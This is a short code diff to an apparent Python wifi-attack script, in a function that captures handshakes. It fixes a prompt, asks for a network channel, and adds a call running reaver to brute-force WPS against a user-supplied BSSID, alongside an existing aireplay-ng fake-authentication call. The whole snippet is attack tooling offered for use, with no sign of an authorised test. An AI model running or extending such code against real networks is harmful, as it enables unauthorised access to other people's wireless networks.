@@ -23,7 +23,9 @@ def handshake(adapter):
     """capture handshake"""
     print("print capturing handshake")
     wifi_mac = input("[+] Input wifi mac address: ")
-    adapter_mac = input("[+ Input adapter mac: ")
+    adapter_mac = input("[+] Input adapter mac: ")
+    channel = input("[+] Input Channel of Wifi Network: ")
+    subprocess.call(['reaver', '--bssid', wifi_mac,'--channel', channel, '--interface', adapter, '-vvv', '--no-associate'])
     subprocess.call(['aireplay-ng','-1', '30', '-a', wifi_mac, '-h', adapter_mac, adapter])
 
 try:
